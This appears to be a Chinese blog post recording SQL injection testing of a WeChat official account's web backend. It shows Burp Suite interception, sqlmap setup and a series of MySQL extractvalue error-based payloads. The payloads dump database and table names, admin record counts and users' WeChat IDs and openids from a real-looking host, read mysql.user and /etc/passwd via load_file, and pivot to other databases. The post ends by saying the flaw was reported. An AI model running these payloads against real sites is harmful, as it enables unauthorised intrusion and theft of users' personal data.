---
layout: post
title: "公众号安全测试"
data: 2016-05-26 11:09:11 
categories: safe
tags: weixin burpsuite mysql 公众号
---

## 公众号安全测试 ##

从公众号复制出来的链接直接访问,自动跳转了, 需要一些准备工作.

- 手机,模拟器也行
- 抓包

### 抓包设置 ###

1. PC端配置**burpsuite**
![PC端burpsuite配置](http://i.imgur.com/QxdaCAI.jpg)
2. 手机端配置, 在 **系统配置>WLAN** 长按已连接wifi,***修改网络***
![手机端配置](http://i.imgur.com/zhnSpP8.jpg)
3. 截包,修改
![change_raw_data](http://i.imgur.com/negaV2R.jpg)

现在已经能对公众号里面的请求进行拦截了.可以发现,直接传入了提交的数据,没有任何过滤.

### 注入测试 ###

使用sqlmap对链接进行测试

1. 选择请求的**Raw数据**,在右键菜单中选择**Save to file**.
![save](http://i.imgur.com/hLSavDf.jpg)
2. 如果是伪静态, 可以直接在有问题参数那添加*号表明注入位置,或者直接修改url为?param=value的样子

		GET /baby/detail/id/14159 HTTP/1.1
		GET /baby/detail/id/14159* HTTP/1.1
		GET /baby/detail/?id=14159 HTTP/1.1

		GET /baby/detail/?id=14159 HTTP/1.1
		Host: 147.yunnanzuixinshi.nfnlh.com
		Proxy-Connection: keep-alive
		Referer: http://147.yunnanzuixinshi.nfnlh.com/baby/index
		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
		X-Requested-With: com.tencent.mm
		User-Agent: Mozilla/5.0 (Linux; U; Android 4.2.2; zh-cn; HUAWEI C8813 Build/JDQ39E) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile 
		
		Safari/534.30 MicroMessenger/6.3.13.49_r4080b63.740 NetType/WIFI Language/zh_CN
		Accept-Encoding: gzip,deflate
		Accept-Language: zh-CN, en-US
		Accept-Charset: utf-8, iso-8859-1, utf-16, *;q=0.7
		Cookie: yunnanzuixinshi=rk3s9ib295gmc6kpqthca3l336; CNZZDATA1256875891=945434797-1464151496-%7C1464227102

	![Inject](http://i.imgur.com/sef5d43.jpg)

使用burpsuit 快速获取信息,优点是不会因为扫描访问过快被封ip

1. 获取数据库

		and extractvalue(1, concat(0x5c,(select database())));

2. 获取用户名 

		and extractvalue(1, concat(0x5c,(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'yunnanzuixinshi' limit 0,1)));
	
3. 获取到表名 ``

		and extractvalue(1, concat(0x5c,(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'yunnanzuixinshi' limit 0,1)));

	- 先将记录发送到 **Intruder**
	- **Positions** 设置注入的**sql**中limit后位置为fuzz位置
	- **Payloads** 中设置 **Payload type** 为 ***Numbers***
	- **Payload Options** 中设置 From:**0**,To:**100**,Step:**1**

	![](http://i.imgur.com/1ySvTqV.jpg)

	获取到系统表名
	![](http://i.imgur.com/9Sekx9K.jpg)

4. 获取表的记录数
		
		and extractvalue(1, concat(0x5c,(SELECT count(1) from bs_admin)));

5. 获取表的字段

		select COLUMN_NAME from information_schema.COLUMNS where table_name = 'bs_openid'
	![](http://i.imgur.com/tM6cNNV.jpg)

6. 数据获取
	
	和获取表名字段名一样,遍历数据

		and extractvalue(1, concat(0x5c,(SELECT concat(id,0x2c,uid,0x2c,wxhao,0x2c,openid,0x2c) from bs_openid limit 2651,1)));

	![](http://i.imgur.com/i2FGFO4.jpg)

7. 其它可以尝试的

		and extractvalue(1, concat(0x5c,(select count(1) from mysql.user limit 0,1)));

	读取Mysql用户

		and extractvalue(1, concat(0x5c,(select hex(load_file(0x2f6574632f706173737764)))));

	读取文件,写文件( `select  code  into outfile 'path'`).

		and extractvalue(1, concat(0x5c,(select grantee from information_schema.user_privileges group by grantee limit 0,1)));

	发现一个可以远程连接的用户 `'xiaoyu_pro'@'%'`
	
		and extractvalue(1, concat(0x5c,(select schema_name from information_schema.schemata  limit 0,1)));

	所有数据库名,发现还不少,这个平台有几十个公众号

		and extractvalue(1, concat(0x5c,(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'shandongzuixinshi' limit 0,1)));

	垮库成功,发现一样的结构,公众号隶属同一家,公司, 数据库权限有限, 接下来要想别的办法了.


### 反馈漏洞 ###
最后,反馈下!
唉,当个好人太难了.
![](http://i.imgur.com/W789pWw.jpg)


	
